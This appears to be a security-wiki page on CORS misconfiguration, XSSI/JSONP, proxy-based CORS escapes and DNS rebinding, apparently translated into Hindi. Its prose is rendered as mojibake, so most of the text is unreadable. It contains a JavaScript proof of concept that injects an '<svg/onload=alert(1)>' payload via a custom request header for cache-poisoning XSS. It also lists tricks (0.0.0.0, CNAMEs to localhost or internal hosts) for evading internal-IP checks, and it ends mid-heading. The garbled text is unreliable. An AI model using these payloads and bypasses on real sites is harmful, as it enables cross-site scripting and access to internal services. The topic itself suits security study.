рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рд╕рд╛рдЭрд╛рдХрд░рдг (CORS) рдиреАрддрд┐рдпрд╛рдБ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░реНрд╕ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреЛрд░реНрд╕ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдХрд╛рд░рдг рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрддрд░ рдХреЛ рд╕реАрдзреЗ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд┐рдирд╛, рдРрд╕реЗ рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реАрдорд┐рдд рд▓рдЧ рд╕рдХрддрд╛ рд╣реИред рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдВрджреБ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ `Vary: Origin` рд╣реЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧреА рдЙрддреНрддрд░ рдХреЛ рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрддреНрддрд░ рд╕реАрдзреЗ рдкреНрд░рд╕реНрдерд╛рди рдХрд░рдиреЗ рдкрд░ рд╕реАрдзреЗ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкрд╣рд▓реЗ рдЕрдиреБрд░реЛрдз рдкрд░ рд╕реАрдзреЗ рдкреНрд░рд╕реНрддреБрдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЫреЛрдбрд╝рддреЗ рд╣реБрдПред рдпрд╣ рддрдВрддреНрд░ рдЧреНрд░рд╛рд╣рдХ-рд╕рд╛рдЗрдб рдХреИрд╢рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓реЗ рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ JSFiddle рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ рд╕рд░рд▓ рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ: рдпрд╣ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдкрд░ рдПрдХ рдЕрдиреБрдХреВрд▓ рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реВрдк рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИред рд╕рдлрд▓ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рд╣реЛрдиреЗ рдкрд░, рдпрд╣ рд▓рдХреНрд╖рд┐рдд URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдЙрддреНрддрд░ рдХреЛ `Vary: Origin` рд╣реЗрдбрд░ рдХрд╛ рд╕рд╣реА рд╕рдВрднрд╛рд▓рди рдХрд┐рдП рдмрд┐рдирд╛ рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЙрдиреНрд╣реЛрдВрдиреЗ рдбрд╛рд▓рд╛ рдЧрдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рд╡рд┐рд╢реНрд▓реЗрд╖рдг рд╣реИ:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## рдмрд╛рдпрдкрд╛рд╕

### XSSI (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдирдХреНрд▓реВрдЬрди) / JSONP

XSSI, рдЬрд┐рд╕реЗ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдирдХреНрд▓реВрдЬрди рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рдХрдордЬреЛрд░реА рд╣реИ рдЬреЛ рдЗрд╕ рддрдереНрдп рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рддреА рд╣реИ рдХрд┐ рд╕реЗрдо рдСрд░рд┐рдЬрд┐рди рдиреАрддрд┐ (SOP) рдХреЛ рдпрд╣рд╛рдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╕рдордп рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрдордЬреЛрд░реА рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдпрд╣ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдХрд┐ рд╡рд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗ рдФрд░ рдкрдврд╝ рд╕рдХреЗред

рдпрд╣ рдХрдордЬреЛрд░реА рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рдЬрд╛рддреА рд╣реИ рдЬрдм рдпрд╣ рдбрд╛рдпрдирд╛рдорд┐рдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ JSONP (рдкреИрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде JSON) рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЖрддреА рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдЖрд╡рд╛рдЬ-рдЕрдзрд┐рдХрд╛рд░ рд╕реВрдЪрдирд╛ рдЬреИрд╕реЗ рдХреБрдХреАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╣реЛрд╕реНрдЯ рд╕реЗ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╕рдордп, рдХреБрдХреАрдЬрд╝ рд╢рд╛рдорд┐рд▓ рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддреА рд╣реИрдВред

рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдФрд░ рдЙрд╕реЗ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд XSSI рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕рдВрдмреЛрдзрди рдХреЗ рд▓рд┐рдП [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) рдкрд░ рдЙрдкрд▓рдмреНрдз BurpSuite рдкреНрд▓рдЧрдЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдкреНрд▓рдЧрдЗрди рдЖрдкрдХреЛ рдЖрдкрдХреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд XSSI рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕рдВрдмреЛрдзрди рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред

[**рдпрд╣рд╛рдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ XSSI рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВред**](xssi-cross-site-script-inclusion.md)

рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ **`рдХреЙрд▓рдмреИрдХ`** **рдкреИрд░рд╛рдореАрдЯрд░** рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред рд╢рд╛рдпрдж рдкреГрд╖реНрда рдХреЛ JSONP рдХреЗ рд░реВрдк рдореЗрдВ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреГрд╖реНрда `Content-Type: application/javascript` рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛ рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛ рдЬреЛ CORS рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдЧрд╛ред

![](<../.gitbook/assets/image (853).png>)

### рдЖрд╕рд╛рди (рдЕрдлрд╝рд╕реЛрд╕рдирд╛рдХ?) рдмрд╛рдпрдкрд╛рд╕

`Access-Control-Allow-Origin` рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рдкрдХреНрд╖ рдореЗрдВ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ рдФрд░ рдкреНрд░рддрд┐рд╕рд╛рдж рднреЗрдЬреЗрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЕрдВрддрд┐рдо рдкреАрдбрд╝рд┐рдд рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд╣реАрдВ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреБрд░реЛрдз рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рднреЗрдЬрддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЕрднрд┐рдорд╛рди рд╢реАрд░реНрд╖рдХ рдХреЛ рдЕрдиреБрд░реЛрдзрд┐рдд рдбреЛрдореЗрди рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред рдпрд╣ CORS рдиреАрддрд┐ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдВ XMLHttpRequest рдХреЗ рд╕рд╛рде рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЙрдкрдпреЛрдЧ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): рдпрд╣ рдЙрдкрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЬреИрд╕рд╛ рд╣реИ, рдЙрд╕реЗ рдЖрдЧреЗ рдирд╣реАрдВ рднреЗрдЬрддреЗ, рд╕рд░реНрд╡рд░ рдЕрдкрдиреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ рдЕрдкрдирд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред

### рдЖрдИрдлреНрд░реЗрдо + рдкреЙрдкрдЕрдк рдмрд╛рдпрдкрд╛рд╕

рдЖрдк **рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдмрдирд╛рдХрд░** рдФрд░ **рдЗрд╕рд╕реЗ рдПрдХ рдирдпрд╛ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓рдХрд░** рдЬреИрд╕реЗ `e.origin === window.origin` рдЬреИрд╕реЗ **CORS рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рд╣реИ:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ

TTL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдорд╛рдирд┐рдпрддрд╛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

1. рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рддрд╛ рд╣реИред
2. рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд╛рд░ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдбреЛрдореЗрди рдХрд╛ DNS (рдЖрдИрдкреА) рдмрджрд▓рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдкреАрдбрд╝рд┐рдд рдХреЗ рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░реЗред
3. рдкреАрдбрд╝рд┐рдд рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ DNS рдкреНрд░рддрд┐рд╕рд╛рдж рдХреЛ рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ TTL (рдЯрд╛рдЗрдо рдЯреВ рд▓рд┐рд╡) рдорд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ DNS рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдХрд┐рддрдиреА рджреЗрд░ рддрдХ рдорд╛рдиреНрдп рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
4. рдЬрдм TTL рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдкреАрдбрд╝рд┐рдд рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рдирдпрд╛ DNS рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдкреГрд╖реНрда рдкрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред
5. рдкреАрдбрд╝рд┐рдд рдХреЗ рдЖрдИрдкреА рдХреЗ рдКрдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдмрдирд╛рдП рд░рдЦрдХрд░, рд╣рдорд▓рд╛рд╡рд╛рд░ рдкреАрдбрд╝рд┐рдд рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдХреАрдЬрд╝ рднреЗрдЬреЗ рдмрд┐рдирд╛ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рдкрд╛рд╕ рдХреИрд╢рд┐рдВрдЧ рддрдВрддреНрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рддреБрд░рдВрдд рджреБрд░реБрдкрдпреЛрдЧ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣рд╛рдВ рднреА рдирд┐рдореНрди TTL рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рдеред

DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдЖрдИрдкреА рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЖрдИрдкреА рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдмреЙрдЯ рдПрдХ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдПрдХ рд╣реА рдкреГрд╖реНрда рдкрд░ рд░рд╣рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреИрд╢ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХрд╛ рд╕рдордп рд╣реЛрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рддреНрд╡рд░рд┐рдд рддрд░реАрдХрд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) рдЬреИрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдкрдиреА рдЦреБрдж рдХреА DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╕рд░реНрд╡рд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдореЗрдВ рдЕрдкрдиреЗ рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ 53/udp рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдирд╛, рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рдП рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдирд╛ (рдЬреИрд╕реЗ, ns.example.com), рдФрд░ рдкрд╣рд▓реЗ рдмрдирд╛рдП рдЧрдП рдП рдЙрдкрдбреЛрдореЗрди рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдирдПрд╕ рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред ns.example.com рдЙрдкрдбреЛрдореЗрди рдХрд╛ рдХреЛрдИ рднреА рдЙрдкрдбреЛрдореЗрди рдЖрдкрдХреЗ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдПрдХ рдЦреБрд▓рд╛ рд╣реБрдЖ рд╕рд░реНрд╡рд░ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ [http://rebind.it/singularity.html](http://rebind.it/singularity.html) рдФрд░ рдЕрдзрд┐рдХ рд╕рдордЭрдиреЗ рдФрд░ рдкреНрд░рдпреЛрдЧ рдХреЗ рд▓рд┐рдПред

### DNS рд░реАрдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **
### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдпрдкрд╛рд╕

* рдпрджрд┐ **рдЖрдВрддрд░рд┐рдХ IPs рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рддреЛ рд╡реЗ **0.0.0.0 рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдирд╛ рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ** (рд▓рд┐рдирдХреНрд╕ рдФрд░ рдореИрдХ рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)
* рдпрджрд┐ **рдЖрдВрддрд░рд┐рдХ IPs рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рддреЛ **localhost** рдХреЗ рд▓рд┐рдП **CNAME** рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрдВ (рд▓рд┐рдирдХреНрд╕ рдФрд░ рдореИрдХ рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)
* рдпрджрд┐ **рдЖрдВрддрд░рд┐рдХ IPs рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ** DNS рдкреНрд░рддрд┐рд╕рд╛рджреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ, рддреЛ рдЖрдк **www.corporate.internal** рдЬреИрд╕реЗ **рдЖрдВрддрд░рд┐рдХ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП CNAMEs** рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

### DNS Rebidding Weaponized

